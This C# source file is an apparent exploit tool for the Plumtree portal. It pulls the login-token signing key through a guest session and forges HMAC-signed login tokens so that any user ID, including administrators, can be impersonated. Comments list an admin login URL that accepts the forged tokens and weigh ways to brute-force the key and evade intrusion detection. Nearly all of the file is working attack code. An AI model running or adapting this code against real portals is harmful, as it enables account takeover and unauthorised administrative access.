using System;
using System.Security.Cryptography;
using System.Text;

using com.plumtree.openfoundation.util;
using com.plumtree.openfoundation.web;
using com.plumtree.openkernel.config;
using com.plumtree.openkernel.factory;
using com.plumtree.server;
using com.plumtree.uiinfrastructure.activityspace;
using com.plumtree.xpshared.config;

namespace CatalogTestHarness
{
	/// <summary>
	/// Summary description for TokenSpoof.
	/// </summary>
	public class TokenSpoof {
		private TokenSpoof() { }

		// the following URL can be used to log into an admin portal
		// if a URL encoded login token is appended to the end of it:
		// http://localhost/portal/server.pt?space=ObjMgr&cached=true&control=AdminLoginTokenControl&ptLTCN=
		// http://localhost/portal/server.pt?control=AdminLoginTokenControl&ptLTCN=

		public const string TokenDelimiter = "|";

		/// <summary>
		/// Should be something like 5715280765444432240
		/// This is randomly generated if you push update in the portal settings screen under Login Token
		/// Not sure where the initial login token comes from. Hopefully it is truly random.
		/// 
		/// It is doubtful this will change very often (if at all, since it supposedly breaks stored encrypted
		/// passwords.
		/// </summary>
		public static string LoginTokenKey = "";

		public static int SessionLifeTime = 10; // session lifetime in minutes

		/// <summary>
		/// The main entry point for the application.
		/// </summary>
		[STAThread]
		public static void MainOld(string[] args) {

BruteToken.CrackToken();
			return;

			// first get the token key
			LoginTokenKey = GetTokenKey();

			// now try to create a session using the key
			IPTSession session = CreateSession(1);
			Console.WriteLine("I am logged in as: " + session.GetUser().GetName());
		}


		#region Get Login Token
		/// <summary>
		/// Get the login token root key from the portal box via a guest session.
		/// </summary>
		/// 
		/// <remarks>
		/// I wonder if we could brute force this by:
		/// get a login token from a request, then compute and brute based on the two numbers
		/// this is only if there is a token passed to an admin box
		/// another brute force method: hit the object manager with login tokens hashed with different keys
		/// (probably would take a while, would trip an IDS or even spike CPU on the admin box
		/// </remarks>
		/// <returns>The login token root key.</returns>
		public static string GetTokenKey() {
			// create a guest session
			IPTSession session = CreateSession("Guest", "");

			// get login token key
			// server config table, ID 65
			IPTServerConfigSettings settings = (IPTServerConfigSettings) session.OpenGlobalObject(PT_GLOBALOBJECTS.PT_GLOBAL_SERVERCONFIGSETTINGS, false);
			return settings.GetSettingAsString(PT_SERVER_CONFIG_SETTINGNAME.PT_TOKEN_PASSWORD);
		}

		#endregion

		#region Spoof Login Token

		/// <summary>
		/// Spoof a login token given the user ID you wish to impersonate.
		/// </summary>
		/// <param name="userId">User ID of the impersonated user.</param>
		/// <returns>A login token you can pass to IPTSession.Reconnect()</returns>
		public static string SpoofLoginToken(int userId) {
			int lifetime = SessionLifeTime;

			// calculate token expiration
			//TODO: check this math
			long millis = (long) (DateTime.UtcNow - new DateTime (1970, 1,1)).TotalMilliseconds;
			long currentSeconds = millis / 1000L;
			long tokenLifetime = (long)lifetime * 60L;
			long expiration = currentSeconds + tokenLifetime;

			// create base token
			string token = userId + TokenDelimiter + expiration + TokenDelimiter;
      
			// spoof the mac function on the token and append
			token += SpoofMac(token);

			return token;
		}

		/// <summary>
		/// Spoof the MAC (message authentication code) part of a login token.
		/// </summary>
		/// <param name="token">The login token to compute a MAC for.</param>
		/// <returns>The MAC for the login token.</returns>
		private static string SpoofMac(string token) {
			//TODO: use .NET native encryption instead of the the Server API
			Encoding encoding = System.Text.Encoding.GetEncoding("UTF-16LE");

			// convert token to bytes
			byte[] bytes = encoding.GetBytes(token); // XPEncoding.GetBytes(token, "UTF-16LE");

			// seed the hashing algorithm
			// the seed comes from the server config table, ID 65
			string seedString = LoginTokenKey;
			byte[] seed =  encoding.GetBytes(seedString);//XPEncoding.GetBytes(seedString, "UTF-16LE"); // where can we get this?
			byte[] macbuffer = GenerateRC2Key(seed);
			HMACSHA1 sha = new HMACSHA1(macbuffer);

			// get the hash
			byte[] hash = sha.ComputeHash(bytes);

			// base 64 encode the result and return it
			return System.Convert.ToBase64String(hash); //XPBase64Coder.Encode(hash);
		}


		/// <summary>
		/// Generate the RC2 key needed to create a MAC for a login token. The funny thing is
		/// that this is MD5, *not* RC2. The function is just called this in the plumtree code
		/// this was hacked from.
		/// </summary>
		/// <param name="seed">Seed bytes for the hash.</param>
		/// <returns>An set of bytes from the hash algorithm.</returns>
		private static byte[] GenerateRC2Key(byte[] seed) {
			byte[] buffer = MD5.Create().ComputeHash(seed);
			for (int i = 5; i < 16; i++) {
				buffer[i] = 0;
			}
			return buffer;
		}

//		/// <summary>
//		/// URL encode the login token.
//		/// </summary>
//		/// <param name="token">Token to encode.</param>
//		/// <returns>URL encoded login token.</returns>
//		public static string EncodeLoginToken(string token) {
//			return HttpUtility.UrlEncode(token);
//			//return XPHttpUtility.UrlEncode(token, LinkConstants.UTF_8_ENCODING);
//		}

		#endregion

		#region Create Session
		/// <summary>
		/// Create a session with a passed in login token.
		/// </summary>
		/// <param name="userId">The user ID to impersonate.</param>
		/// <returns></returns>
		public static IPTSession CreateSession(int userId) {
			string loginToken = SpoofLoginToken(userId);
			// Create a session with the portal native API.
			IOKContext context = OKConfigFactory.createInstance(ConfigPathResolver.GetOpenConfigPath(), "portal");
			PortalObjectsFactory.Init(context);
			IPTSession ptSession = PortalObjectsFactory.CreateSession();
			ptSession.Reconnect(loginToken);
		
			return ptSession;
		}

		/// <summary>
		/// Create a session (IPTSession) given a username and password.
		/// </summary>
		/// <param name="user">the user name</param>
		/// <param name="password">the password</param>
		/// <returns>the session</returns>
		public static IPTSession CreateSession(String user, String password) {
			// Create a session with the portal native API.
			IOKContext context = OKConfigFactory.createInstance(ConfigPathResolver.GetOpenConfigPath(), "portal");
			PortalObjectsFactory.Init(context);
			IPTSession ptSession = PortalObjectsFactory.CreateSession();
			ptSession.Connect(user, password, null);
				
			return ptSession;
		}

		#endregion
	
	}
}
